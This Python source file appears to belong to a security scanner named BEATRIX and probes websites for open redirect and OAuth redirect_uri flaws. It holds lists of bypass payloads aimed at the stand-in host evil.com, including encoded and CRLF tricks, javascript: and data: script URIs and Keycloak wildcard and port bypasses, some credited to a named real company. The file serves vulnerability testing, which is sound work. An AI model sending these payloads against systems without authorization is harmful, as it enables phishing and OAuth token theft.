"""
BEATRIX Open Redirect Scanner

Detects open redirect vulnerabilities which can be used for:
- Phishing attacks (redirect to look-alike domain)
- OAuth token theft (redirect_uri manipulation)
- SSRF chain (redirect internal requests)

This is a HIGH-VALUE bug class for bug bounties, especially on OAuth flows.
"""

from typing import AsyncIterator, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext


class OpenRedirectScanner(BaseScanner):
    """
    Open Redirect Vulnerability Scanner

    Tests for unvalidated redirects in URL parameters, headers, and responses.
    """

    name = "redirect"
    description = "Open redirect vulnerability scanner"
    version = "1.0.0"

    # Parameters commonly used for redirects
    REDIRECT_PARAMS = [
        "redirect", "redirect_uri", "redirect_url", "redirectUrl", "redirectUri",
        "return", "return_to", "returnTo", "return_url", "returnUrl",
        "next", "next_url", "nextUrl", "next_page",
        "url", "uri", "target", "dest", "destination",
        "redir", "rurl", "goto", "go", "link",
        "continue", "continueTo", "continue_url",
        "forward", "forward_url", "forwardUrl",
        "success", "success_url", "successUrl",
        "error", "error_url", "errorUrl",
        "callback", "callback_url", "callbackUrl",
        "fallback", "fallback_url",
        "login_redirect", "logout_redirect",
        "ref", "referer", "referrer",
        "out", "out_url", "outUrl",
        "view", "site", "path",
    ]

    # Payloads to test
    PAYLOADS = [
        # Direct external URLs
        {
            "payload": "https://evil.com",
            "name": "direct_url",
            "description": "Direct external URL redirect",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "//evil.com",
            "name": "protocol_relative",
            "description": "Protocol-relative URL redirect",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "http://evil.com",
            "name": "http_url",
            "description": "HTTP external URL redirect",
            "severity": Severity.MEDIUM,
        },

        # URL encoding bypasses
        {
            "payload": "https:%2f%2fevil.com",
            "name": "url_encoded_slashes",
            "description": "URL encoded slashes bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "https://evil%2ecom",
            "name": "url_encoded_dot",
            "description": "URL encoded dot bypass",
            "severity": Severity.MEDIUM,
        },

        # Backslash tricks
        {
            "payload": "https://evil.com\\@legitimate.com",
            "name": "backslash_bypass",
            "description": "Backslash URL parsing bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "\\\\evil.com",
            "name": "double_backslash",
            "description": "Double backslash redirect",
            "severity": Severity.MEDIUM,
        },

        # @ symbol tricks
        {
            "payload": "https://legitimate.com@evil.com",
            "name": "at_symbol_bypass",
            "description": "@ symbol URL parsing bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "https://legitimate.com%40evil.com",
            "name": "encoded_at_bypass",
            "description": "Encoded @ symbol bypass",
            "severity": Severity.MEDIUM,
        },

        # Null byte / whitespace
        {
            "payload": "https://evil.com%00.legitimate.com",
            "name": "null_byte_bypass",
            "description": "Null byte injection bypass",
            "severity": Severity.HIGH,
        },
        {
            "payload": " https://evil.com",
            "name": "leading_space",
            "description": "Leading whitespace bypass",
            "severity": Severity.MEDIUM,
        },

        # JavaScript protocol
        {
            "payload": "javascript:alert(document.domain)",
            "name": "javascript_protocol",
            "description": "JavaScript protocol injection",
            "severity": Severity.HIGH,
        },
        {
            "payload": "data:text/html,<script>alert(1)</script>",
            "name": "data_protocol",
            "description": "Data protocol injection",
            "severity": Severity.HIGH,
        },

        # Tab/newline injection
        {
            "payload": "https://evil.com%09",
            "name": "tab_injection",
            "description": "Tab character bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "https://evil.com%0d%0a",
            "name": "crlf_injection",
            "description": "CRLF injection in redirect",
            "severity": Severity.HIGH,
        },

        # OAuth-specific bypasses (HIGH VALUE)
        {
            "payload": "https://evil.com#",
            "name": "fragment_bypass",
            "description": "Fragment bypass for OAuth",
            "severity": Severity.HIGH,
        },
        {
            "payload": "https://evil.com?",
            "name": "query_bypass",
            "description": "Query string bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "https://legitimate.com.evil.com",
            "name": "subdomain_bypass",
            "description": "Subdomain matching bypass",
            "severity": Severity.HIGH,
        },
        {
            "payload": "https://legitimatecom.evil.com",
            "name": "typo_subdomain",
            "description": "Missing dot subdomain bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "https://evil.com/.legitimate.com",
            "name": "path_bypass",
            "description": "Path-based whitelist bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "https://evil.com/%2f%2f.legitimate.com",
            "name": "encoded_path_bypass",
            "description": "Encoded path whitelist bypass",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "///evil.com",
            "name": "triple_slash",
            "description": "Triple slash redirect",
            "severity": Severity.MEDIUM,
        },
        {
            "payload": "\\/\\/evil.com",
            "name": "escaped_slashes",
            "description": "Escaped slash redirect",
            "severity": Severity.MEDIUM,
        },
    ]

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Scan for open redirect vulnerabilities"""

        self.log(f"Scanning for open redirects on {context.url}")

        parsed = urlparse(context.url)
        existing_params = parse_qs(parsed.query)

        # Test existing redirect parameters (HIGH VALUE - params actually in the URL)
        tested_params = set()
        for param in existing_params:
            if param.lower() in [p.lower() for p in self.REDIRECT_PARAMS]:
                self.log(f"Found redirect parameter: {param}")
                tested_params.add(param.lower())
                async for finding in self._test_parameter(context.url, param, existing_param=True):
                    yield finding

        # Probe a small set of common redirect params to check if server accepts them.
        # Only test params that DON'T already exist in the URL.
        # First do a baseline request to get the "natural" redirect behavior.
        target_host = urlparse(context.url).netloc.lower()
        try:
            baseline = await self.get(context.url, follow_redirects=False)
            baseline_status = baseline.status_code
            baseline_location = baseline.headers.get("location", "")
        except Exception:
            baseline_status = None
            baseline_location = ""

        # If the bare URL already issues a redirect (e.g., 308 pinterest.com → www.pinterest.com),
        # that's a canonical host redirect, NOT an open redirect. We need to detect and skip these.
        is_canonical_redirect = False
        if baseline_status in [301, 302, 307, 308] and baseline_location:
            canon_host = urlparse(baseline_location).netloc.lower()
            # Same domain (with or without www prefix) = canonical redirect
            if canon_host == target_host or canon_host == f"www.{target_host}" or target_host == f"www.{canon_host}":
                is_canonical_redirect = True
                self.log(f"Target has canonical redirect ({baseline_status} → {canon_host}), filtering")

        for param in self.REDIRECT_PARAMS[:6]:  # Test top 6 only
            if param.lower() in tested_params:
                continue
            if param.lower() in [p.lower() for p in existing_params]:
                continue

            # Quick probe: does the server even use this param?
            # Send a benign value first to check if param is accepted
            probe_url = f"{context.url}{'&' if existing_params else '?'}{param}=https://example.com"
            try:
                probe = await self.get(probe_url, follow_redirects=False)

                # Only test if server redirected with our probe (param is functional)
                if probe.status_code in [301, 302, 303, 307, 308]:
                    probe_location = probe.headers.get("location", "")
                    probe_dest = urlparse(probe_location).netloc.lower()

                    # Skip canonical redirects that just pass params through
                    # e.g., pinterest.com?redirect=X → www.pinterest.com/?redirect=X
                    if is_canonical_redirect:
                        canon_dest = urlparse(baseline_location).netloc.lower()
                        if probe_dest == canon_dest or probe_dest == target_host:
                            continue  # Same canonical redirect, param is NOT used for redirect

                    # Server used our param to redirect to example.com — worth testing
                    if "example.com" in probe_dest:
                        self.log(f"Server accepts redirect param: {param}")
                        async for finding in self._test_parameter(context.url, param, existing_param=False):
                            yield finding
                    # Otherwise server redirected but NOT to our value — skip

            except Exception:
                pass

    async def _test_parameter(self, base_url: str, param: str, existing_param: bool = True) -> AsyncIterator[Finding]:
        """Test a specific parameter for open redirect"""

        for payload_info in self.PAYLOADS:
            payload = payload_info["payload"]

            # Build test URL
            parsed = urlparse(base_url)
            params = parse_qs(parsed.query)
            params[param] = [payload]

            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))

            try:
                # Don't follow redirects automatically
                response = await self.get(test_url, follow_redirects=False)

                # Check for redirect
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get("location", "")

                    if self._is_malicious_redirect(location, payload, target_url=base_url):
                        # Adjust confidence: existing params are more credible
                        confidence = Confidence.CERTAIN if existing_param else Confidence.FIRM
                        yield self._create_redirect_finding(
                            base_url, test_url, param, payload_info, location, response,
                            confidence_override=confidence
                        )

                # Check meta refresh
                if response.status_code == 200:
                    body = response.text[:5000] if hasattr(response, 'text') else ""
                    if self._check_meta_refresh(body, payload):
                        yield self._create_redirect_finding(
                            base_url, test_url, param, payload_info,
                            "meta refresh", response, is_meta=True
                        )

                # Check JavaScript redirect
                if response.status_code == 200:
                    body = response.text[:10000] if hasattr(response, 'text') else ""
                    if self._check_js_redirect(body, payload):
                        yield self._create_redirect_finding(
                            base_url, test_url, param, payload_info,
                            "JavaScript redirect", response, is_js=True
                        )

            except Exception as e:
                self.log(f"Error testing {param}={payload}: {e}")

    def _is_malicious_redirect(self, location: str, payload: str, target_url: str = "") -> bool:
        """Check if the redirect location is attacker-controlled.

        CRITICAL: We must verify the redirect DESTINATION HOST is attacker-controlled,
        not just that the payload string appears somewhere in the Location header.
        A server that redirects ?redirect=https://evil.com to
        https://www.target.com/?redirect=https%3A%2F%2Fevil.com is NOT vulnerable —
        the destination is still target.com.
        """

        if not location:
            return False

        # Check for javascript:/data:/vbscript: protocols — these are always dangerous
        location_stripped = location.strip()
        if location_stripped.lower().startswith(("javascript:", "data:", "vbscript:")):
            return True

        # Parse the redirect destination to check the HOST
        try:
            parsed = urlparse(location_stripped)
            dest_host = parsed.netloc.lower().split('@')[-1].split(':')[0]  # handle user@host:port

            # Protocol-relative URLs (//evil.com)
            if not parsed.scheme and location_stripped.startswith("//"):
                dest_host = location_stripped.lstrip('/').split('/')[0].split(':')[0].split('?')[0].lower()

            if not dest_host:
                return False

            # DEFENSE: If the redirect destination is the TARGET itself (or its www variant),
            # this is NOT an open redirect — it's a canonical redirect passing params through.
            if target_url:
                target_host = urlparse(target_url).netloc.lower().split(':')[0]
                target_root = target_host.removeprefix('www.')
                dest_root = dest_host.removeprefix('www.')
                if dest_root == target_root:
                    return False

            # Check if the destination host is our canary domain
            evil_patterns = ["evil.com", "evil%2ecom", "evil%2Ecom"]
            for pattern in evil_patterns:
                if pattern in dest_host:
                    return True

            # Check for subdomain bypass: legitimate.com.evil.com
            if dest_host.endswith(".evil.com") or dest_host == "evil.com":
                return True

        except Exception:
            pass

        return False

    def _check_meta_refresh(self, body: str, payload: str) -> bool:
        """Check for meta refresh redirect to payload — validate destination HOST"""
        import re

        meta_pattern = r'<meta[^>]*http-equiv=["\']?refresh["\']?[^>]*content=["\'][^"\']*url=([^"\'\>\s]+)'
        matches = re.findall(meta_pattern, body, re.IGNORECASE)

        for match in matches:
            try:
                parsed = urlparse(match.strip())
                dest_host = parsed.netloc.lower().split('@')[-1].split(':')[0]
                if 'evil.com' in dest_host:
                    return True
            except Exception:
                pass
            # Also check for javascript: / data: protocols in meta refresh
            if match.strip().lower().startswith(('javascript:', 'data:', 'vbscript:')):
                return True

        return False

    def _check_js_redirect(self, body: str, payload: str) -> bool:
        """Check for JavaScript redirect to payload — validate destination HOST"""

        js_patterns = [
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
            r'location\.replace\s*\(\s*["\']([^"\']+)["\']',
            r'location\.assign\s*\(\s*["\']([^"\']+)["\']',
        ]

        import re
        for pattern in js_patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            for match in matches:
                try:
                    parsed = urlparse(match.strip())
                    dest_host = parsed.netloc.lower().split('@')[-1].split(':')[0]
                    if 'evil.com' in dest_host:
                        return True
                except Exception:
                    pass
                # Also check for javascript: / data: protocols
                if match.strip().lower().startswith(('javascript:', 'data:', 'vbscript:')):
                    return True

        return False

    def _create_redirect_finding(
        self,
        base_url: str,
        test_url: str,
        param: str,
        payload_info: dict,
        location: str,
        response,
        is_meta: bool = False,
        is_js: bool = False,
        confidence_override: Optional[Confidence] = None,
    ) -> Finding:
        """Create an open redirect finding"""

        redirect_type = "HTTP redirect"
        if is_meta:
            redirect_type = "Meta refresh redirect"
        elif is_js:
            redirect_type = "JavaScript redirect"

        severity = payload_info["severity"]

        # OAuth endpoints get severity bump
        oauth_indicators = ["oauth", "auth", "login", "sso", "redirect_uri", "callback"]
        if any(ind in base_url.lower() for ind in oauth_indicators):
            if severity == Severity.MEDIUM:
                severity = Severity.HIGH

        evidence = f"""Open Redirect Detected!

Type: {redirect_type}
Parameter: {param}
Payload: {payload_info['payload']}
Bypass Technique: {payload_info['description']}

Request URL: {test_url}
Redirect Location: {location}
Status Code: {response.status_code}
"""


        # Determine confidence
        if confidence_override:
            confidence = confidence_override
        elif is_js:
            confidence = Confidence.FIRM
        else:
            confidence = Confidence.CERTAIN

        return self.create_finding(
            title=f"Open Redirect via {param} parameter",
            severity=severity,
            confidence=confidence,
            url=test_url,
            description=f"""The application redirects users to an attacker-controlled URL via the '{param}' parameter.

{payload_info['description']}

This can be used for:
- Phishing attacks (redirect to fake login page)
- OAuth token theft (steal authorization codes)
- Bypassing URL allowlists""",
            evidence=evidence,
            request=f"GET {test_url}\nHost: {urlparse(base_url).netloc}",
            response=f"HTTP/1.1 {response.status_code}\nLocation: {location}",
            remediation="""1. Use an allowlist of permitted redirect destinations
2. Don't pass the full URL - use path-only or identifier-based redirects
3. Validate redirect URLs on the server side
4. For OAuth, strictly validate redirect_uri against pre-registered values""",
            references=[
                "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
                "https://portswigger.net/kb/issues/00500100_open-redirection-reflected",
                "https://cwe.mitre.org/data/definitions/601.html",
            ],
        )


class OAuthRedirectScanner(BaseScanner):
    """
    Specialized scanner for OAuth redirect_uri vulnerabilities.

    These are HIGH VALUE findings as they can lead to token theft.
    """

    name = "oauth_redirect"
    description = "OAuth redirect_uri vulnerability scanner"
    version = "1.0.0"

    # OAuth endpoints to look for
    OAUTH_PATHS = [
        "/oauth/authorize",
        "/oauth2/authorize",
        "/oauth/auth",
        "/authorize",
        "/auth",
        "/login/oauth",
        "/connect/authorize",
        "/api/oauth/authorize",
        "/v1/oauth/authorize",
        "/v2/oauth/authorize",
        # Keycloak-specific paths (discovered on Zooplus)
        "/auth/realms/master/protocol/openid-connect/auth",
        "/auth/realms/app/protocol/openid-connect/auth",
        "/realms/master/protocol/openid-connect/auth",
        "/realms/app/protocol/openid-connect/auth",
        # Generic realm pattern — try common names
        "/auth/realms/main/protocol/openid-connect/auth",
        "/auth/realms/production/protocol/openid-connect/auth",
        "/auth/realms/default/protocol/openid-connect/auth",
    ]

    # redirect_uri bypass payloads
    REDIRECT_URI_BYPASSES = [
        # Subdomain tricks
        ("https://evil.com#@legitimate.com", "Fragment bypass"),
        ("https://legitimate.com.evil.com", "Subdomain suffix"),
        ("https://legitimatecom.evil.com", "No dot subdomain"),
        ("https://evil.legitimate.com", "Subdomain prefix"),

        # Path tricks
        ("https://legitimate.com/callback/../../../evil.com", "Path traversal"),
        ("https://legitimate.com/callback/..%2f..%2fevil.com", "Encoded traversal"),
        ("https://legitimate.com/callback?url=https://evil.com", "Nested parameter"),

        # Special characters
        ("https://legitimate.com\\@evil.com", "Backslash at-sign"),
        ("https://legitimate.com%40evil.com", "Encoded at-sign"),
        ("https://evil.com%23.legitimate.com", "Encoded fragment"),

        # Protocol tricks
        ("//evil.com", "Protocol relative"),
        ("///evil.com", "Triple slash"),
        ("////evil.com", "Quadruple slash"),

        # Keycloak wildcard matching (Zooplus lesson)
        # Keycloak supports *.domain.com wildcard redirect_uris
        # Test if attacker-controlled subdomain is accepted
        ("https://evil.legitimate.com/callback", "Keycloak wildcard subdomain (*.domain.com)"),
        ("https://attacker-controlled.legitimate.com", "Keycloak wildcard arbitrary subdomain"),
        ("https://xss.legitimate.com/steal", "Keycloak wildcard with attacker path"),

        # Port-based bypass (Zooplus had different services on different ports)
        ("https://legitimate.com:8443/evil", "Port-based bypass (8443)"),
        ("https://legitimate.com:4443/callback", "Port-based bypass (4443)"),
        ("https://legitimate.com:9090/callback", "Port-based bypass (9090)"),
    ]

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Scan for OAuth redirect_uri vulnerabilities"""

        parsed = urlparse(context.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        self.log(f"Scanning OAuth endpoints on {base}")

        # Find OAuth endpoints
        oauth_urls = []
        for path in self.OAUTH_PATHS:
            oauth_urls.append(f"{base}{path}")

        # Also check current URL if it looks like OAuth
        if any(p in context.url for p in ["oauth", "authorize", "auth"]):
            oauth_urls.append(context.url)

        for url in oauth_urls:
            async for finding in self._test_oauth_endpoint(url):
                yield finding

    async def _test_oauth_endpoint(self, url: str) -> AsyncIterator[Finding]:
        """Test an OAuth endpoint for redirect_uri issues"""

        parsed = urlparse(url)
        base_domain = parsed.netloc.replace("www.", "")

        for payload, description in self.REDIRECT_URI_BYPASSES:
            # Replace 'legitimate.com' with actual domain
            test_payload = payload.replace("legitimate.com", base_domain)

            # Build OAuth URL
            test_url = f"{url}?response_type=code&client_id=test&redirect_uri={test_payload}"

            try:
                response = await self.get(test_url, follow_redirects=False)

                # Check if redirect_uri was accepted (not rejected with error)
                if response.status_code in [200, 302]:
                    # Look for signs the redirect_uri was accepted
                    body = response.text[:5000] if hasattr(response, 'text') else ""

                    # If we see a login page or consent page, uri was likely accepted
                    if response.status_code == 200:
                        accept_indicators = ["login", "sign in", "authorize", "consent", "allow"]
                        reject_indicators = ["invalid_redirect_uri", "redirect_uri_mismatch", "invalid redirect"]

                        body_lower = body.lower()
                        if any(ind in body_lower for ind in accept_indicators):
                            if not any(ind in body_lower for ind in reject_indicators):
                                yield self._create_oauth_finding(url, test_url, test_payload, description, response)

                    # If redirecting, check where
                    elif response.status_code == 302:
                        location = response.headers.get("location", "")
                        if "evil.com" in location or test_payload in location:
                            yield self._create_oauth_finding(url, test_url, test_payload, description, response)

            except Exception as e:
                self.log(f"Error testing OAuth: {e}")

    def _create_oauth_finding(
        self,
        endpoint: str,
        test_url: str,
        payload: str,
        bypass_type: str,
        response,
    ) -> Finding:
        """Create OAuth redirect_uri finding"""

        return self.create_finding(
            title=f"OAuth redirect_uri Bypass: {bypass_type}",
            severity=Severity.HIGH,
            confidence=Confidence.FIRM,
            url=test_url,
            description=f"""The OAuth authorization endpoint accepts a manipulated redirect_uri parameter.

Bypass technique: {bypass_type}
Payload: {payload}

This allows an attacker to:
1. Create a malicious OAuth authorization link
2. Trick victim into clicking (phishing)
3. Steal the OAuth authorization code/token
4. Access victim's account on the connected service""",
            evidence=f"OAuth endpoint accepted redirect_uri: {payload}",
            request=f"GET {test_url}",
            response=f"HTTP/1.1 {response.status_code}",
            remediation="""1. Strictly validate redirect_uri against pre-registered values
2. Use exact string matching, not substring or regex
3. Don't allow wildcards in registered redirect_uris
4. Implement state parameter to prevent CSRF""",
            references=[
                "https://portswigger.net/web-security/oauth",
                "https://datatracker.ietf.org/doc/html/rfc6749#section-10.6",
                "https://oauth.net/articles/authentication/",
            ],
        )
